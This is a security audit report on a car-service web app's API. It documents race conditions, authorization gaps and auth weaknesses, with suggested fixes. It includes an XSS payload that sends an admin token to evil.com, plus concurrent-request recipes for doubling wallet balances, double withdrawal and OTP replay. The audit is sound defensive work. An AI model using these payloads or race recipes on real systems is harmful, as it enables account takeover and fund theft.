# Phase 3 Security Audit V2 — Independent Deep Review

**Date:** 2026-10-13
**Branch:** feature/cloudflare-d1-validation @ 7694b77
**Prior audit baseline:** 917b2b2 (docs-only diff since then — code state is identical)
**Methodology:** Static code review (no runtime testing). All findings verified by reading source.
**Scope:** All API routes + lib files + middleware + config. 84 source files reviewed.

## Executive Summary

- **Total findings: 20** (6 prior + 14 new)
- **Critical: 2** | **High: 4** | **Medium: 9** | **Low: 5**
- **Files reviewed: 84** (69 API routes + 15 lib/config files)
- **Status: ⚠️ CONDITIONAL** — 2 CRITICAL findings must be fixed before merge. PR #3 should NOT merge until SEC-7 and SEC-8 are resolved.

The prior audit (commit `fdb908c`) was technically accurate on all 6 of its findings, but its **positive findings overstated coverage**. Specifically, it claimed "prepay + gateway (404 in production)" as a positive — true on the feature branch — but missed that `/api/vip/subscribe`, `/api/wallets`, `/api/dashboard`, `/api/care/bookings/[id]/timeline` have systemic authorization or race-condition gaps.

The most severe new findings are two CRITICAL race conditions in the wallet subsystem (SEC-7: free VIP subscription; SEC-8: wallet balance doubling via concurrent GET) and one CRITICAL business-logic bypass (VIP subscription accepts no payment).

---

## Finding Classification (Confirmed vs. Needs-Runtime-Verification)

Each finding is classified by **evidence type** so reviewers know what is statically proven vs. what needs a runtime test to fully confirm.

| ID | Severity | Evidence type | Confidence | Needs runtime test? |
|----|----------|---------------|------------|---------------------|
| SEC-1 | HIGH | External (GitHub API: `protected: false`) | Confirmed | No — branch settings are the test |
| SEC-2 | MEDIUM | Static (code path: P2002 not in catch) | Confirmed | Optional (to prove 500 vs 409) |
| SEC-3 | MEDIUM | Static (grep: 0 usages of `withIdempotency`) | Confirmed | No |
| SEC-4 | MEDIUM | Static (no `auditLog.create` in route) | Confirmed | No |
| SEC-5 | LOW→MEDIUM | Static (no distinct status code path) | Confirmed | Optional (to prove enumeration) |
| SEC-6 | LOW | Static (SAFE_USER_SELECT not enforced) | Confirmed | No |
| **SEC-7** | **CRITICAL** | Static (route body: no payment validation) | **Confirmed** | Recommended (to prove ACTIVE state) |
| **SEC-8** | **CRITICAL** | Static + logic analysis (non-atomic read-modify-write) | **Confirmed (high)** | **Yes — concurrent GET test required** |
| **SEC-9** | **HIGH** | Static + logic analysis (stale `balanceAfter` SET) | **Confirmed (high)** | **Yes — concurrent withdraw test required** |
| **SEC-10** | **HIGH** | Static + logic analysis (non-atomic find+update) | **Confirmed (high)** | **Yes — concurrent verify test required** |
| **SEC-11** | **HIGH** | Static (route body: no ownership call) | **Confirmed** | Optional (curl with two users) |
| SEC-12 | MEDIUM | Static (no BOLA in dashboard route) | Confirmed | Optional |
| SEC-13 | MEDIUM | Static (distinct status codes) | Confirmed | Optional |
| SEC-14 | MEDIUM | Static (JWT in localStorage) | Confirmed | No |
| SEC-15 | MEDIUM | Static (no Session table for admin) | Confirmed | No |
| SEC-16 | MEDIUM | Static (trusts X-Forwarded-For) | Confirmed | Recommended |
| SEC-17 | LOW | Static (module-level secret read) | Confirmed | No |
| SEC-18 | LOW | Static (ensureDefaultAdmin on every login) | Confirmed | No |
| SEC-19 | LOW | Static (no role hierarchy enforcement) | Confirmed | No |
| SEC-20 | LOW | Static (no CSRF token) | Confirmed | No |

**Legend:**
- **Confirmed** = the vulnerable code path exists and is reachable per static reading. Does NOT require a successful exploit to be valid.
- **Needs runtime test** = the race window or timing assumption should be empirically reproduced before declaring exploitation confirmed. The static defect is real either way; runtime test only confirms exploitability.

**Bottom line:** All 20 findings are statically confirmed. Three race-condition findings (SEC-8, SEC-9, SEC-10) additionally warrant concurrent-runtime tests in Phase 4 to confirm the exploit window is actually open (not closed by an upstream lock we may have missed).

---

## Verification of Prior Audit (6 findings)

### SEC-1 — Branch protection NOT enabled on `main` (HIGH)

**Status:** PARTIALLY CONFIRMED — user is enabling via GitHub UI in parallel.
**Evidence:** Not a codebase artifact — branch protection is a GitHub repository setting. Codebase contains no `.github/CODEOWNERS` file, no `.github/workflows/branch-protection.yml`. CI workflows exist (`.github/workflows/` referenced in commit history) but their `required: true` status-check enforcement depends on the GitHub UI setting.
**Updated assessment:** HIGH (unchanged). User confirmed they are enabling it in parallel; verify before merging PR #3. Codebase itself has no additional protection gaps (no bypass via direct-push allowed in CI config).

### SEC-2 — Duplicate payment records can be created (MEDIUM)

**Status:** CONFIRMED.
**Evidence:** `src/app/api/payments/route.ts:101,145` — flow is `payment.findUnique({ where: { invoiceId } })` → if null → `payment.create({ data: { invoiceId, ... } })`. Two concurrent requests can both see `existing === null` and both call `payment.create`. The unique constraint on `invoiceId` rejects the second with `P2002`, but the route has NO try/catch around `payment.create` — the error propagates as a 500.
**Mitigating factors on feature branch:**
- Line 88-93: `if (inv.status === "PAID") return 409` (sequential check)
- Lines 111-114, 159-162: `db.invoice.updateMany({ where: { id, status: { not: "PAID" } } })` (optimistic concurrency on invoice status)
**Updated assessment:** MEDIUM (unchanged). The unique constraint prevents duplicate records at the DB level, but the unhandled P2002 surfaces as a 500 — bad UX and noisy in logs.

### SEC-3 — Idempotency helper exists but is UNUSED (MEDIUM)

**Status:** CONFIRMED.
**Evidence:** `grep -rn "withIdempotency|getIdempotencyKey" /tmp/mekanix-feature/src/app/api/` returns **0 matches** in any route. The helper is defined in `src/lib/auth.ts:440,450` and re-exported via `src/modules/auth/index.ts:33-34`, but no route actually calls it. The `IdempotencyKey` D1 table and the `idemMemStore` Map are dead code.
**Updated assessment:** MEDIUM (unchanged). The dead-code weight is small; the real risk is missing idempotency for gateway retry scenarios (Zarinpal/IDPay callbacks).

### SEC-4 — admin/[resource]/[id] has NO audit logging (MEDIUM)

**Status:** CONFIRMED + EXPANDED.
**Evidence:** `grep -c "writeAuditLog" src/app/api/admin/[resource]/[id]/route.ts` = **0**. The PATCH handler modifies technicians, customers (including user.status ban/activate), categories, reviews, and payments (refunds) with NO audit log.
**Additional routes missing audit logging (NEW):**
- `src/app/api/mechanic-applications/[id]/approve/route.ts` — grants TECHNICIAN role (privilege escalation), no audit
- `src/app/api/mechanic-applications/[id]/reject/route.ts` — no audit
- `src/app/api/care/admin/packages/route.ts` (POST) — no audit
- `src/app/api/care/admin/rules/route.ts` (POST) — no audit
**Only 3 routes use `writeAuditLog`:** admin-panel/onboarding POST, PATCH, DELETE (cosmetic content, low risk).
**Updated assessment:** MEDIUM (unchanged severity, but scope expanded). Sensitive operations — user bans, role grants, payment refunds — have ZERO audit trail across all admin routes except onboarding.

### SEC-5 — Failed admin login attempts not tracked (LOW)

**Status:** CONFIRMED + UPGRADED.
**Evidence:** `src/app/api/admin-panel/auth/login/route.ts` — no `rateLimitAsync` call, no `writeAuditLog` on failed attempts. The only throttle is bcrypt's CPU cost (~250ms/verify at cost=12). An attacker can fire 1000s of attempts/s; each consumes a CPU-bound bcrypt but the server is also DoS'd.
**Additional issue (NEW):** The route returns 404 for "user not found" and 401 for "wrong password" (lines 14, 17) — a textbook user-enumeration signal.
**Updated assessment:** LOW → **MEDIUM**. The 404-vs-401 distinction actively enables username enumeration on top of the missing rate limit.

### SEC-6 — `auth/session` route exposes user data without BOLA check (LOW)

**Status:** CONFIRMED.
**Evidence:** `src/app/api/auth/session/route.ts:12-26` — `SAFE_USER_SELECT` is a `const` object passed to Prisma's `select`. There's no runtime enforcement — adding a new sensitive field to this const silently exposes it. The route returns the caller's OWN record (BOLA-safe — `session.userId` from JWT), but the allowlist is documentation-by-convention.
**Updated assessment:** LOW (unchanged). Real risk only materializes if a future sensitive field is added to `SAFE_USER_SELECT` without review.

---

## New Findings

### SEC-7 (CRITICAL): VIP subscription bypass — no payment verification

**Location:** `src/app/api/vip/subscribe/route.ts:14-76`
**Category:** Business-logic bypass / Auth-adjacent

**Description:** The route accepts a `planId` from the request body and creates an `ACTIVE` `UserVipSubscription` with `startedAt=now`, `expiresAt=now+plan.durationDays`. The `paymentId` body field is optional and **never validated** against the `Payment` table. The route header comment explicitly says: *"In production: this would go through the payment gateway first. Here: we simulate success."* — but there is **NO production guard** returning 404 (unlike `/api/prepay` and `/api/gateway/*` which DO return 404 in production).

**Attack scenario:**
1. Attacker registers via OTP (`POST /api/auth/otp/send` + `/verify`).
2. Attacker calls `GET /api/vip/plans` to enumerate plan IDs and pick the most expensive one.
3. Attacker calls `POST /api/vip/subscribe` with body `{ "planId": "<most_expensive_plan_id>" }`.
4. Server creates an ACTIVE subscription with full VIP benefits (free periodic visit, priority service, `discountPct` percent off future bookings). No payment was ever made.

**Preconditions:**
- Attacker has a valid authenticated session (trivially obtained via OTP self-registration).
- The `/api/vip/subscribe` route is reachable in the deployment environment (i.e., not behind a feature flag we did not see). It IS reachable in the feature branch code.
- No upstream middleware blocks the route.

**Reproduction (read-only — do NOT run against production):**
1. In a local dev environment: register a user via `POST /api/auth/otp/send` + `/api/auth/otp/verify`.
2. `GET /api/vip/plans` → note any `planId`.
3. `POST /api/vip/subscribe` with body `{ "planId": "<id>" }` and the session cookie.
4. Observe: response 200 with an `ACTIVE` subscription; no `Payment` row was created with `SUCCEEDED` status for this user.

**Impact:** Free VIP subscriptions for any authenticated user. Direct revenue loss; abuse of VIP-only discounts on future bookings.

**Suggested fix:** Either (a) add a production guard returning 404 until the real payment gateway is wired up (consistent with `/api/prepay`), OR (b) require a verified `paymentId` field and validate it server-side:
```ts
if (!paymentId) return NextResponse.json({ error: "paymentId required" }, { status: 400 });
const payment = await db.payment.findUnique({ where: { id: paymentId } });
if (!payment || payment.userId !== session.userId || payment.status !== "SUCCEEDED"
    || payment.amount < plan.price) {
  return NextResponse.json({ error: "Invalid payment" }, { status: 400 });
}
```

**Effort to fix:** S (1–2 hours)

---

### SEC-8 (CRITICAL): Wallet balance doubling via concurrent GET /api/wallets

**Location:** `src/app/api/wallets/route.ts:50-67`
**Category:** Concurrency / Race condition / Funds theft

**Description:** The GET `/api/wallets` route implements an "auto-release" side-effect: for each `walletTransaction` with `status: "PENDING"` and `holdUntil < now`, it (1) updates the transaction status to `"AVAILABLE"` (unconditional `update`, no WHERE on status), and (2) updates the wallet with `pendingBalance: { decrement: t.netAmount }, balance: { increment: t.netAmount }` (Prisma atomic ops).

The race window: between reading `wallet.transactions` (line 33-39) and the per-transaction update (lines 56-66), another concurrent GET can read the same transaction as PENDING. Both calls then:
- Both call `walletTransaction.update` → both succeed (idempotent set to AVAILABLE)
- Both call `wallet.update` → both succeed (each atomically decrements/increments)

The wallet's `balance` is incremented TWICE for a single released transaction.

**Attack scenario:**
1. Technician has a PENDING `walletTransaction` with `netAmount = 50` and `holdUntil < now`.
2. Technician opens two browser tabs to the earnings page simultaneously, OR runs `Promise.all([fetch('/api/wallets'), fetch('/api/wallets')])` in the console.
3. Both GETs see the same releasable transaction.
4. Both update the transaction to AVAILABLE (idempotent).
5. Both update the wallet: balance += 50 each.
6. **Result:** wallet balance is 100, but only 50 was actually released. Technician can withdraw 100, stealing 50 from the platform.

**Preconditions:**
- Technician has at least one `walletTransaction` with `status: "PENDING"` and `holdUntil < now`.
- No upstream mutex/lock serializes GET `/api/wallets` (none found in code review; Next.js handles requests concurrently).
- D1/SQLite writer is not single-threaded at the platform layer (in dev with SQLite + WAL, concurrent writers can interleave).

**Reproduction (read-only — do NOT run against production):**
1. Seed a wallet with one PENDING transaction, `netAmount = 50`, `holdUntil` in the past.
2. Record `balance_before = wallet.balance`.
3. Issue two concurrent GETs: `Promise.all([fetch('/api/wallets', { headers: { cookie } }), fetch('/api/wallets', { headers: { cookie } })])`.
4. After both resolve, issue a third GET to read the final `balance`.
5. Expected if vulnerable: `balance = balance_before + 100` (doubled). Expected if safe: `balance = balance_before + 50`.

**Impact:** Direct fund theft. Any technician with a pending-release transaction can double their balance by triggering concurrent reads.

**Suggested fix:** Use conditional update with count check before applying the wallet delta:
```ts
const releaseResult = await db.walletTransaction.updateMany({
  where: { id: t.id, status: "PENDING" },
  data: { status: "AVAILABLE", releasedAt: now },
});
if (releaseResult.count === 1) {
  await db.wallet.update({
    where: { id: wallet.id },
    data: { pendingBalance: { decrement: t.netAmount }, balance: { increment: t.netAmount } },
  });
}
```

**Effort to fix:** S (30 minutes)

---

### SEC-9 (HIGH): Wallet withdraw race — stale `balanceAfter` allows double withdrawal

**Location:** `src/app/api/wallets/withdraw/route.ts:62-94`
**Category:** Concurrency / Funds theft

**Description:** The withdraw flow reads `wallet.balance` (line 62-65), computes `balanceAfter = balanceBefore - amount` (line 68), and then calls `db.wallet.updateMany({ where: { id, balance: { gte: amount } }, data: { balance: balanceAfter } })` (lines 87-90).

The SET clause uses the **stale, pre-computed `balanceAfter`** value (from line 68). Two concurrent withdraw requests can both:
- Read `balance = 1000` (initial)
- Compute `balanceAfter = 500` (each, independently)
- Both pass the `balance >= amount` WHERE check
- Both SET balance to `500` (idempotent value — the second SET does NOT decrement again)

Both withdrawal requests are created (each for amount=500), but the wallet balance is only effectively deducted once (1000 → 500). When the admin approves both withdrawals, the technician receives 1000 in their bank account, but the wallet was only debited by 500. **Net platform loss: 500.**

The prior audit's "positive finding" claimed `wallets/withdraw: atomic balance deduction (updateMany with balance gte)`. The use of `updateMany` with a conditional WHERE is the right pattern, BUT the SET clause must use Prisma's atomic `decrement` operation, not a stale pre-computed value.

**Attack scenario:**
1. Technician has wallet balance = 1000 (e.g., earned from a few jobs).
2. Technician sends two concurrent POSTs to `/api/wallets/withdraw` with `{ amount: 500 }` (using `Promise.all` or two tabs).
3. Both requests pass the `balance >= 500` check; both set balance to 500.
4. Two `WithdrawalRequest` rows are created (each for 500).
5. Admin approves both → technician receives 1000 in bank.
6. Wallet balance = 500, but technician was paid 1000. **Platform loses 500.**

**Preconditions:**
- Technician wallet has `balance >= amount`.
- No upstream mutex serializes POST `/api/wallets/withdraw` (none found).
- D1/SQLite writer can interleave two transactions (true in dev; D1 has serializable writes but the two requests are separate transactions, so the read-then-write pattern is still vulnerable because both reads happen before either write).

**Reproduction (read-only — do NOT run against production):**
1. Seed wallet with `balance = 1000`.
2. Issue two concurrent withdraws: `Promise.all([fetch('/api/wallets/withdraw', { method: 'POST', body: JSON.stringify({ amount: 500 }), headers: { cookie, 'content-type': 'application/json' } }), <same>])`.
3. After both resolve, GET `/api/wallets` to read final balance.
4. Count `withdrawalRequest` rows created.
5. Expected if vulnerable: `balance = 500` (deducted once), `withdrawalRequest` count = 2. Expected if safe: `balance = 0` and one request created (or one request 422'd).

**Impact:** Direct fund theft via concurrent withdrawal requests.

**Suggested fix:** Use Prisma's atomic decrement operation:
```ts
const deductResult = await db.wallet.updateMany({
  where: { id: wallet.id, balance: { gte: amount } },
  data: { balance: { decrement: amount } },  // <-- atomic SQL: SET balance = balance - amount
});
if (deductResult.count === 0) {
  throw new Error("Insufficient balance (concurrent request)");
}
```
The SQL becomes `UPDATE Wallet SET balance = balance - X WHERE id = ? AND balance >= X`, which is truly atomic per-row.

**Effort to fix:** S (30 minutes — one-line change to `data`)

---

### SEC-10 (HIGH): OTP one-time-code replay via consumption race condition

**Location:** `src/app/api/auth/otp/verify/route.ts:53-63`
**Category:** Auth / Race condition / Replay attack

**Description:** The verify flow:
1. `otpCode.findFirst({ where: { phone, code: codeHash, consumed: false } })` (line 53-56)
2. `otpCode.update({ where: { id: otp.id }, data: { consumed: true } })` (line 63)

These are TWO separate DB queries with NO atomicity guard. Two concurrent verify requests with the same valid code can both:
- Both pass `findFirst` (both see `consumed: false`)
- Both call `update` (idempotent set to `consumed: true`)
- Both proceed to create a session for the same user

The "one-time" property of OTP codes is violated.

**Attack scenario:**
1. Attacker intercepts a valid OTP code (via SMS interception, SIM swap, shoulder-surfing, or social engineering).
2. Attacker submits the code TWICE concurrently before the legitimate user does: `Promise.all([fetch('/api/auth/otp/verify', { body: code }), fetch('/api/auth/otp/verify', { body: code })])`.
3. Both requests succeed; both create sessions for the victim's account.
4. Attacker now has TWO active sessions on the victim's account.
5. Worse: if the legitimate user later tries to verify the same code, it's already consumed — they're locked out, with no signal that an attacker used the code.

Even without code interception, an attacker who can guess a 6-digit code (1 in 1M) within the 5-minute validity window can submit it concurrently with the legitimate user — both succeed.

**Preconditions:**
- Attacker has intercepted a valid OTP code (via SMS interception, SIM swap, shoulder-surfing, or social engineering).
- No upstream mutex serializes POST `/api/auth/otp/verify` (none found).
- The two concurrent requests arrive within the race window (between `findFirst` and `update`).

**Reproduction (read-only — do NOT run against production):**
1. Send OTP: `POST /api/auth/otp/send { phone }`.
2. Obtain the code (in dev, from DB or console log).
3. Issue two concurrent verifies: `Promise.all([fetch('/api/auth/otp/verify', { method:'POST', body: JSON.stringify({ phone, code }), headers:{'content-type':'application/json'} }), <same>])`.
4. Inspect responses: both should return a session token if vulnerable.
5. Inspect `otpCode.consumed`: should be `true` (idempotent set), but `session` table should have TWO new rows for the same user if vulnerable.

**Impact:** OTP replay attacks; undermines the one-time-code contract; potential account-takeover amplification.

**Suggested fix:** Use `updateMany` with a conditional WHERE on `consumed: false`:
```ts
const consumed = await db.otpCode.updateMany({
  where: { id: otp.id, consumed: false },
  data: { consumed: true },
});
if (consumed.count === 0) {
  return NextResponse.json({ error: "Code already used" }, { status: 400 });
}
```

**Effort to fix:** S (15 minutes)

---

### SEC-11 (HIGH): BOLA on /api/care/bookings/[id]/timeline — no ownership check

**Location:** `src/app/api/care/bookings/[id]/timeline/route.ts:5-12`
**Category:** BOLA / IDOR

**Description:** The route calls `requireAuth(req)` (any authenticated user passes) but does NOT call `requireBookingParticipant(session, id)` (or any other ownership check). It then returns `db.serviceTimelineEvent.findMany({ where: { bookingId: id } })` — the full timeline of any booking by ID.

Compare to the sibling routes that DO have BOLA:
- `/api/care/bookings/[id]/route.ts:17` — `requireBookingParticipant(session, id)`
- `/api/care/bookings/[id]/inspection/route.ts:13` — same
- `/api/care/bookings/[id]/findings/route.ts:13` — same
- `/api/care/bookings/[id]/health-report/route.ts:13` — same
- `/api/care/technician/missions/[id]/route.ts:22` — same

The timeline route is the only one missing the check — likely an oversight.

**Attack scenario:**
1. Attacker is any authenticated user (customer, technician, or partner).
2. Attacker enumerates booking IDs. CUIDs are 24-char strings — not brute-forceable, but they may be leaked via:
   - URLs in logs/screenshots
   - Insecure direct-object-reference in another endpoint
   - Predictable if any code generates IDs with `Math.random()` (none found in this audit, but worth monitoring)
3. For each booking ID, attacker calls `GET /api/care/bookings/[id]/timeline` and receives:
   - `eventType` strings (booking_created, inspection_started, extra_proposal, customer_approved, etc.)
   - `actor` user IDs (correlates actions to specific users)
   - `metadata` JSON (may include approvalIds, findingIds)

**Preconditions:**
- Attacker is any authenticated user (customer, technician, or partner).
- Attacker knows (or can guess) a target `bookingId`. CUIDs are 24-char strings — not brute-forceable, but they may be leaked via:
  - URLs in logs/screenshots
  - Another endpoint that lists booking IDs without BOLA
  - Error messages that echo the ID
  - Referrer headers in shared links
- The route is reachable in production.

**Reproduction (read-only — do NOT run against production):**
1. As user A, create a booking → note `bookingId_A`.
2. As user B (different account), call `GET /api/care/bookings/<bookingId_A>/timeline`.
3. Observe: response 200 with timeline events for user A's booking (expected if vulnerable: 200 + data; expected if safe: 403 or 404).

**Impact:** Cross-tenant information disclosure. Timeline events reveal the full service history of other users' bookings, including actor user IDs.

**Suggested fix:** Add `requireBookingParticipant` after `requireAuth`:
```ts
const authErr = await requireBookingParticipant(session, id);
if (authErr) return authErr;
```

**Effort to fix:** S (5 minutes — two lines)

---

### SEC-12 (MEDIUM): Dashboard exposes PII to all authenticated users

**Location:** `src/app/api/dashboard/route.ts:8-129`
**Category:** BOLA / Over-disclosure / PII leak

**Description:** The dashboard route requires auth (`requireAuth`) but has NO role check. The response includes:
- `techPerformance` (line 77-92): array of `{ name: technician.user.name, jobs: count, rating, revenue }` for EVERY technician in the system.
- `recentActivity` (line 95-109): array of recent jobs with `{ label: "${j.code} · ${j.request.title}", sub: "${j.technician.user.name} → ${j.request.customer.user.name}" }` — discloses customer names, technician names, job codes, and job titles.
- `categoryBreakdown` (line 60-72): revenue per service category.
- `revenueSeries` (line 47-53): daily revenue for the last 14 days.

The route's comment claims "Customer/Technician see aggregate stats (no PII)" — but the response actually contains PII (names) and per-technician revenue.

**Attack scenario:**
1. A customer calls `GET /api/dashboard`.
2. Response contains: every technician's name + revenue + rating; recent jobs with both customer and technician names; platform-wide revenue trends.
3. Customer now has business intelligence: which technicians earn the most, who the most active customers are, total platform revenue.

**Impact:** Cross-tenant PII leak (customer + technician names); business intelligence exposure.

**Suggested fix:** Add `requireRole(session, "ADMIN")` after `requireAuth`. OR scope the response by role:
- ADMIN: full dashboard (current behavior)
- CUSTOMER/TECHNICIAN: only their own KPIs (their own job count, their own recent activity)

**Effort to fix:** M (1–2 hours)

---

### SEC-13 (MEDIUM): Admin login user enumeration via distinct status codes

**Location:** `src/app/api/admin-panel/auth/login/route.ts:14,17`
**Category:** Auth / User enumeration

**Description:** The route returns:
- `404` with `{ error: "کاربر یافت نشد" }` when `adminUser.findFirst` returns null (user not found)
- `401` with `{ error: "پسورد اشتباه است" }` when password verification fails

This distinction allows an attacker to enumerate valid admin usernames/emails by observing the status code.

**Attack scenario:**
1. Attacker iterates through common admin email/username patterns: `admin`, `administrator`, `root`, `support@mekanix.ir`, `ops@mekanix.ir`, etc.
2. For each, sends `POST /api/admin-panel/auth/login` with `emailOrUsername` and a dummy password.
3. 401 response → valid username exists; 404 response → username doesn't exist.
4. Attacker now has a confirmed list of valid admin usernames to brute-force.

**Impact:** Reconnaissance for brute-force attacks; admin username disclosure.

**Suggested fix:** Return the same 401 status and identical error message for both cases:
```ts
if (!admin) return NextResponse.json({ error: "اطلاعات ورود نامعتبر است" }, { status: 401 });
const ok = await verifyPassword(password, admin.passwordHash);
if (!ok) return NextResponse.json({ error: "اطلاعات ورود نامعتبر است" }, { status: 401 });
```

**Effort to fix:** S (5 minutes)

---

### SEC-14 (MEDIUM): Admin JWT in localStorage — XSS-exfiltratable

**Location:** `src/app/api/admin-panel/auth/login/route.ts:20-21`, `src/lib/admin-auth.ts:36-42`
**Category:** Auth / Token storage / XSS

**Description:** The admin login route returns the JWT in the JSON response body:
```ts
return NextResponse.json({ token, admin: { ... } });
```
The admin frontend (`src/app/admin-panel/page.tsx:222`) stores this token in `localStorage` and sends it via `Authorization: Bearer` on subsequent requests.

Unlike the **user** JWT (stored in HttpOnly cookie, never readable by JS — `src/app/api/auth/otp/verify/route.ts:139-145`), the **admin** JWT is fully readable by any JavaScript running on the admin-panel page. An XSS payload in any admin-editable field (technician bio, category name, ticket message rendered in admin UI) could exfiltrate the admin token.

The admin token has a 7-day TTL (`src/lib/admin-auth.ts:40`) and there's no revocation mechanism (see SEC-15).

**Attack scenario:**
1. Admin edits a technician profile via `/api/admin/[resource]/[id]` with a malicious `bio` field: `<img src=x onerror="fetch('//evil.com/?t='+localStorage.getItem('admin_token'))">`.
2. The bio is stored verbatim (no HTML sanitization in the API).
3. Another admin views the technician profile in the admin UI; the bio renders as HTML; the XSS payload fires and exfiltrates the admin token.
4. Attacker now has a valid admin token for 7 days.

**Impact:** Admin account takeover via XSS.

**Suggested fix:** Use HttpOnly cookie for admin token (same pattern as user auth). If frontend needs the token in JS, mint a short-lived (5min) nonce for API calls. OR at minimum: add a strict Content-Security-Policy header to admin-panel pages (no `unsafe-inline`).

**Effort to fix:** M (4–6 hours — refactor admin auth to cookie-based, update frontend)

---

### SEC-15 (MEDIUM): Admin JWT irrevocable for 7 days — no Session table

**Location:** `src/lib/admin-auth.ts:44-55,57-61`
**Category:** Auth / Token revocation

**Description:** `verifyAdminToken` only verifies the JWT signature + expiry. There is NO database check (unlike the user `verifySession` which checks the `Session` table for revocation). Once an admin JWT is issued, it's valid for 7 days regardless of:
- Admin password change
- Admin account deletion (the user record is gone but the JWT still works)
- Admin "logout" (frontend just clears localStorage — server has no record to revoke)
- Admin role downgrade (e.g., SUPER_ADMIN → ADMIN; the JWT still carries the old role)

The user auth flow has a proper Session table with `revokedAt` tracking; the admin auth flow does NOT.

**Attack scenario:**
1. Admin logs in from a public computer.
2. Admin closes the browser tab (but doesn't explicitly log out, or the logout endpoint doesn't exist for admin).
3. Attacker accesses the same browser later, extracts the admin JWT from IndexedDB/localStorage.
4. Attacker has a valid admin token for up to 7 days.
5. Even if the admin changes their password, the old token remains valid.

**Impact:** Compromised admin accounts cannot be secured without waiting for token expiry.

**Suggested fix:** Create an `AdminSession` table (mirroring `Session`), persist `tokenHash` on login, check revocation in `verifyAdminToken`. Add `POST /api/admin-panel/auth/logout` that marks the session as revoked.

**Effort to fix:** L (8–12 hours — schema migration + lib refactor + new endpoint)

---

### SEC-16 (MEDIUM): Rate-limit bypass via X-Forwarded-For spoofing

**Location:** `src/lib/rate-limit.ts:24-31`, `src/lib/auth.ts:83-91`
**Category:** Auth / Rate limiting

**Description:** `getClientId(req)` extracts the client ID as:
1. `userId` if passed (used by some authenticated routes — good)
2. `X-Forwarded-For` header (first hop, split by comma)
3. `X-Real-IP` header
4. Fallback: literal string `"anonymous"`

**Issues:**

(a) **Dev mode (Node.js without proxy):** clients can set `X-Forwarded-For: <random-ip>` with each request to get a fresh rate-limit budget. The 60/min API default becomes effectively unlimited. Also applies to OTP send (20/hour per IP) and OTP verify (5/min per IP) — brute-force protection is bypassable in dev.

(b) **Fallback to "anonymous":** if no IP/UA is available, all such requests share a single rate-limit bucket keyed `"anonymous"`. In production on Cloudflare Workers, the `CF-Connecting-IP` header is always set, but `getClientId` doesn't read it — it reads `X-Forwarded-For` (which Cloudflare also sets, but is less authoritative).

**Attack scenario (dev):** Attacker sends `X-Forwarded-For: 1.2.3.4` then `5.6.7.8` etc. with each request — each IP gets its own 60/min budget.

**Attack scenario (prod edge case):** If a request reaches the Worker without `X-Forwarded-For` set (e.g., direct origin access if Cloudflare is bypassed), it falls back to "anonymous", sharing a single bucket with all such requests.

**Impact:** Rate-limit bypass in dev mode; weakened rate limiting in edge cases in production.

**Suggested fix:**
```ts
export function getClientId(req: Request, userId?: string): string {
  if (userId) return userId;
  // Cloudflare sets CF-Connecting-IP — prefer it over X-Forwarded-For
  const cfIp = req.headers.get("cf-connecting-ip");
  if (cfIp) return cfIp;
  const forwarded = req.headers.get("x-forwarded-for");
  if (forwarded) return forwarded.split(",")[0].trim();
  const realIp = req.headers.get("x-real-ip");
  if (realIp) return realIp;
  // Don't fall back to a single "anonymous" bucket — that's an amplification vector.
  // Use a hash of UA + accept-language + path so different clients get different buckets.
  const ua = req.headers.get("user-agent") ?? "";
  return `anon:${hashSha256(ua).slice(0, 16)}`;
}
```

**Effort to fix:** S (30 minutes)

---

### SEC-17 (LOW): admin-auth.ts JWT_SECRET read at module level (inconsistent with user auth)

**Location:** `src/lib/admin-auth.ts:8`
**Category:** Auth / Secret management

**Description:** `const JWT_SECRET = process.env.JWT_SECRET;` is read at MODULE LOAD time. The user-facing `src/lib/auth.ts:33-43` was fixed on the feature branch to read `process.env.JWT_SECRET` INSIDE the `getSecret()` function body, with the comment: *"in Workers/OpenNext, process.env may not be fully populated at module evaluation time"*. However, `admin-auth.ts` was NOT updated with the same fix — it still reads `JWT_SECRET` at module level and caches it in a `const`.

**Impact:**
- If `JWT_SECRET` is rotated via `wrangler secret put JWT_SECRET`, user JWTs use the new secret (good), but admin JWTs continue to be signed/verified with the OLD cached secret until the Worker is redeployed.
- In Workers with `nodejs_compat`, env vars may be injected asynchronously; reading at module-eval time may yield `undefined`.

**Suggested fix:** Move the read inside `getAdminSecret()`:
```ts
function getAdminSecret(): Uint8Array {
  const secret = process.env.JWT_SECRET;
  if (!secret) {
    if (process.env.NODE_ENV === "production") {
      throw new Error("JWT_SECRET environment variable is required in production");
    }
    return encoder.encode("mekanix-admin-dev-secret-change-me");
  }
  return encoder.encode(secret);
}
```

**Effort to fix:** S (5 minutes)

---

### SEC-18 (LOW): `ensureDefaultAdmin()` called on every login attempt — DoS amplifier

**Location:** `src/app/api/admin-panel/auth/login/route.ts:6`
**Category:** DoS / Performance

**Description:** `await ensureDefaultAdmin()` runs at the START of every login POST. It performs `db.adminUser.count()` (a DB round-trip) on every request, BEFORE the request body is even parsed. An attacker can flood `/api/admin-panel/auth/login` with empty/malformed bodies to amplify DB load — each request triggers a count query before failing on body parsing.

`ensureDefaultAdmin()` is idempotent and effectively a no-op once any admin exists, but the COUNT query still hits the DB every time.

**Attack scenario:** Attacker sends 1000 req/s to `/api/admin-panel/auth/login` with empty bodies. Each request triggers `db.adminUser.count()` (DB round-trip). The DB is hit with 1000 extra count queries/s, on top of the normal auth flow.

**Impact:** DoS amplification — extra DB load per request.

**Suggested fix:** Move `ensureDefaultAdmin()` to a one-time startup hook, or cache the result with a long TTL:
```ts
let adminCheckDone = false;
async function ensureDefaultAdminOnce() {
  if (adminCheckDone) return;
  await ensureDefaultAdmin();
  adminCheckDone = true;
}
```
Or call it lazily on first authenticated request only.

**Effort to fix:** S (10 minutes)

---

### SEC-19 (LOW): No admin role hierarchy enforcement

**Location:** `src/lib/admin-auth.ts:22-26`, `src/lib/admin-auth.ts:36-55`
**Category:** Auth / Privilege escalation (structural)

**Description:** The `AdminSession` type has `role: string` — a free-form string, not a union. `ensureDefaultAdmin()` creates admins with `role: "SUPER_ADMIN"` (line 97). The login route returns whatever role is stored in the DB. `requireRole(session, "ADMIN")` (in `src/lib/auth.ts:255`) accepts ANY string match — it doesn't enforce a hierarchy.

There's no `requireSuperAdmin` helper, no concept of "ADMIN can do X but not Y". Currently only `SUPER_ADMIN` is created, so the issue is latent. But if a future admin with role `ADMIN` (lower privilege) is created, they would have the SAME access as `SUPER_ADMIN` because all admin routes use `requireRole(session, "ADMIN")` which accepts either.

